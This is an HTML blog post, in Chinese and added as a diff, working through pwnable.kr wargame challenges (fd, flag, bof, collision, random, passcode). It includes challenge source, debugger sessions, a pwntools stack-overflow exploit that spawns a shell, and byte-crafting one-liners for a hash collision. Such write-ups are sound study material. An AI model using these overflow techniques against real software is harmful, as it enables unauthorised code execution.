@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>pwnable.kr | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="分析pwnable.kr（和tw）上的题系列  fdssh上服务器，看到源代码，没必要下载，直接看c文件就行 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char*">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr">
+<meta property="og:url" content="http://example.com/2019/06/25/2019-06-25-kr_1st/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="分析pwnable.kr（和tw）上的题系列  fdssh上服务器，看到源代码，没必要下载，直接看c文件就行 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char*">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-06-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-06-25-kr_1st" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/06/25/2019-06-25-kr_1st/" class="article-date">
+  <time class="dt-published" datetime="2019-06-24T16:00:00.000Z" itemprop="datePublished">2019-06-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      pwnable.kr
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>分析pwnable.kr（和tw）上的题系列</p>
+</blockquote>
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>ssh上服务器，看到源代码，没必要下载，直接看c文件就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len = 0;</span><br><span class="line">	len = read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题就是把<code>int fd = atoi( argv[1] ) - 0x1234;</code>中的<strong>fd</strong>搞成0即可，让后边的read函数第一个参数为标准输入0即可，0x1234-&gt;4660，然后再输<code>LETMEWIN</code>就搞定了🤣，这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd</span><br><span class="line">pass argv[1] a number</span><br><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+<h2 id="main参数"><a href="#main参数" class="headerlink" title="main参数"></a>main参数</h2><p>本题分析一下main函数参数<strong>argc</strong>（参数个数），<strong>angv</strong>（参数，当成数组存储），<strong>envp</strong>（环境变量）</p>
+<p>乱写了一堆代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">printf(&quot;%d\n&quot;,argc);</span><br><span class="line"></span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(argv[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,argv[i]);</span><br><span class="line">	</span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(envp[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,envp[i]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行一遍可以看看具体的含义，但是不知道为啥最后输出环境变量时会<code>Segmentation fault (core dumped)</code>，很迷，这里埋个伏笔吧，觉得是环境变量访问越界，有知道的大佬希望能指点一下本菜鸡</p>
+<h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int val;</span><br><span class="line">   char str[20];</span><br><span class="line">   strcpy(str, &quot;98993489&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   strcpy(str, &quot;123\n254g9i0sd235.net&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">String value = 98993489, Int value = 98993489</span><br><span class="line">String value = 123</span><br><span class="line">254g9i0sd235.net, Int value = 123</span><br></pre></td></tr></table></figure>
+
+<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d:%s&quot;,i,buf);&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">q</span><br><span class="line">-1:0:q</span><br><span class="line">w</span><br><span class="line">1:w</span><br><span class="line">e</span><br><span class="line">2:e</span><br><span class="line">3:e</span><br><span class="line">4:e</span><br></pre></td></tr></table></figure>
+<p>我们可以看到-1的时候read函数没有发生什么而且把标准输入的位置给占了，1，2都是正常的输入，到3的时候就不处理了，直接输出</p>
+<p>我们看一看到底成功没有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d time:%s and the len is %d&quot;,i,buf,len);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real </span><br><span class="line">-1 time: and the len is -1</span><br><span class="line">q</span><br><span class="line">0 time:q</span><br><span class="line"> and the len is 2</span><br><span class="line">w</span><br><span class="line">1 time:w</span><br><span class="line"> and the len is 2</span><br><span class="line">e</span><br><span class="line">2 time:e</span><br><span class="line"> and the len is 2</span><br><span class="line">3 time:e</span><br><span class="line"> and the len is -1</span><br><span class="line">4 time:e</span><br><span class="line"> and the len is -1</span><br></pre></td></tr></table></figure>
+
+<p>通过看上边的代码和结果我们简单总结一下<strong>read</strong>函数</p>
+<ul>
+<li><code>\n</code>也会被当作输入</li>
+<li>返回值为输入长度，发生错误返回-1</li>
+<li>-1的情况不太一样，和输入语境有关系？？</li>
+</ul>
+<blockquote>
+<p>深入分析pwnable.kr上的题系列[二]</p>
+</blockquote>
+<p>先看这个逆向</p>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>有upx壳，直接脱了，发现<code>checksec</code>可以直接看壳子，好强啊，膜一下这个神器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ checksec flag</span><br><span class="line">[*] &#x27;/home/pic/Desktop/flag&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; // ST08_8</span><br><span class="line"></span><br><span class="line">  puts(&quot;I will malloc() and strcpy the flag there. take it.&quot;, argv, envp);</span><br><span class="line">  dest = malloc(100LL);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ida反编译结果，意思是我malloc一块然后把flag赋值到里边，然后直接看<strong>flag</strong>就完事了</p>
+<p>这题源代码差不多长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">char *flag = &quot;haha&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; </span><br><span class="line">  printf(&quot;I will malloc() and strcpy the flag there. take it.&quot;);</span><br><span class="line">  dest = malloc(100);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>题目给的c文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	// smash me!</span><br><span class="line">	if(key == 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们看到必须让<strong>key</strong>变成<code>0xcafebabe</code>我们知道调用函数时程序把参数入栈我们只需要让<code>overflowme</code>这个局部变量溢出即可，下面用两个工具ida和gdb调试搞一下</p>
+<h3 id="方法一：ida"><a href="#方法一：ida" class="headerlink" title="方法一：ida"></a>方法一：ida</h3><p>看到key的位置在<code>ebp+8</code>，而<code>char s; // [esp+1Ch] [ebp-2Ch]</code>，两者相差52字节，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bof&#x27;)</span><br><span class="line">p.recvuntil(&#x27;overflow me : \n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*52+p32(0xcafebabe))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./bof&#x27;: pid 46987</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(pic) gid=1000(pic) groups=1000(pic),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br></pre></td></tr></table></figure>
+<p>总是感觉这种方法不太优雅，下面说一下gdb神器</p>
+<h3 id="方法二：gdb"><a href="#方法二：gdb" class="headerlink" title="方法二：gdb"></a>方法二：gdb</h3><p>直接<code>s</code>步入<code>func</code>里，到比较的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print $ebp</span><br><span class="line">$1 = (void *) 0xffffd1d8</span><br><span class="line">pwndbg&gt; x/16gx 0xffffd1d8+8</span><br><span class="line">0xffffd1e0:	0x00000000deadbeef	0x00000000565556b9</span><br><span class="line">0xffffd1f0:	0xf7fb6000f7fb6000	0xf7df6e8100000000</span><br><span class="line">0xffffd200:	0xffffd29400000001	0xffffd224ffffd29c</span><br><span class="line">0xffffd210:	0x0000000000000001	0xf7fe575af7fb6000</span><br><span class="line">0xffffd220:	0x00000000f7ffd000	0x00000000f7fb6000</span><br><span class="line">0xffffd230:	0x40c4cae300000000	0x0000000001bc4cf3</span><br><span class="line">0xffffd240:	0x0000000000000000	0x5655553000000001</span><br><span class="line">0xffffd250:	0xf7feae2000000000	0x56556ff4f7fe59b0</span><br></pre></td></tr></table></figure>
+<p>我们看到了<code>0xdeadbeef</code>要和<code>0xcafebabe</code>比较，我们需要覆盖这个值，找一下偏移量</p>
+<p>看一下<code>gets</code>函数参数，即<strong>overflowme</strong>地址，找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x56555649 &lt;func+29&gt;    lea    eax, [ebp - 0x2c]</span><br><span class="line">0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">0x5655564f &lt;func+35&gt;    call   gets &lt;0xf7e452b0&gt;</span><br></pre></td></tr></table></figure>
+<p>eax值为<code>0xffffd1ac</code>，然后比较一波</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance 0xffffd1ac 0xffffd1d8+8</span><br><span class="line">0xffffd1ac-&gt;0xffffd1e0 is 0x34 bytes (0xd words)</span><br></pre></td></tr></table></figure>
+<p>偏移量也为0x34，结束战斗</p>
+<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>这题主要的是理解题目所给函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip = (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res=0;</span><br><span class="line">	for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们看到程序让我们输入第二个参数，且参数长度为20，然后跳到<code>check_password</code>函数中，我们看到它把char指针转成了int指针，所以每次加一都成了加四，让20个输入的字符经过逐个相加得到特定值即可，网上找了找思路，大致都是先算，然后用<code>echo</code>或<code>python</code>输入字节，然后发现一个大佬把特定字符给搞出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./col `echo -n -e &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; `</span><br><span class="line"> </span><br><span class="line">./col $(python -c &#x27;print &quot;\xc9\xce\xc5\x06&quot;*4+&quot;\xc8\xce\xc5\x06&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">./col `python -c &quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;`</span><br><span class="line"></span><br><span class="line">./col b4_9b4_9b4_9b4e4d8ZA(大佬行为)</span><br></pre></td></tr></table></figure>
+
+<p>分析一下<code>python</code>这个小脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ (python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">ls</span><br><span class="line">pic@ubuntu:~/Desktop$ $(python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">col  flag  te.py</span><br><span class="line">pic@ubuntu:~/Desktop$ ls</span><br><span class="line">col  flag  te.py</span><br></pre></td></tr></table></figure>
+<p>可以看到把<code>ls</code>经过转换后然后用python打印，不加<code>$</code>就是普通打印，加上就是<code>ls</code>命令，<code>echo</code>命令同理</p>
+<blockquote>
+<p>深入分析pwnable.kr上的题系列[三]</p>
+</blockquote>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>看到这题，本质就是<code>rand()</code>函数的伪随机，我们在<code>rand</code>函数之前，未使用<code>srand</code>函数给种子，<code>rand</code>就自己调用<code>srand(1)</code>，（其实<code>srand(0)</code>也是这数，我们看看这个小demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	unsigned int random;</span><br><span class="line">	random = rand();</span><br><span class="line">	printf(&quot;first is %p\n&quot;,random);</span><br><span class="line">	for(int i =0;i&lt;10;i++)&#123;</span><br><span class="line">		srand(i);			</span><br><span class="line">		random = rand();</span><br><span class="line">		printf(&quot;num %d is %p\n&quot;,i,random);</span><br><span class="line">		&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./te </span><br><span class="line">first is 0x6b8b4567</span><br><span class="line">num 0 is 0x6b8b4567</span><br><span class="line">num 1 is 0x6b8b4567</span><br><span class="line">num 2 is 0x59b997fa</span><br><span class="line">num 3 is 0x47db4e3a</span><br><span class="line">num 4 is 0x754e7ddd</span><br><span class="line">num 5 is 0x232add1b</span><br><span class="line">num 6 is 0x11560ebd</span><br><span class="line">num 7 is 0x3e52dff5</span><br><span class="line">num 8 is 0x2d274378</span><br><span class="line">num 9 is 0x1a7dd803</span><br></pre></td></tr></table></figure>
+
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>先把这个文件<code>scp</code>下载下来，<code>scp -P 2222  passcode@pwnable.kr:/home/passcode/passcode /home/pic/Desktop</code>，pwnable上的ssh端口全都改成了2222，所以需要指定一下，下来后我们先研究一下漏洞点，c文件如下</p>
+<blockquote>
+<p>Safeguard、operation and source code</p>
+</blockquote>
+<p>ssh连接上去后直接运行后发现出错，我们使用<strong>scp</strong>命令从服务器下载下来源码和程序进行进一步逆向分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./passcode </span><br><span class="line">Toddler&#x27;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : 1</span><br><span class="line">Welcome 1!</span><br><span class="line">enter passcode1 : 1</span><br><span class="line">[1]    7138 segmentation fault (core dumped)  ./passcode</span><br></pre></td></tr></table></figure>
+
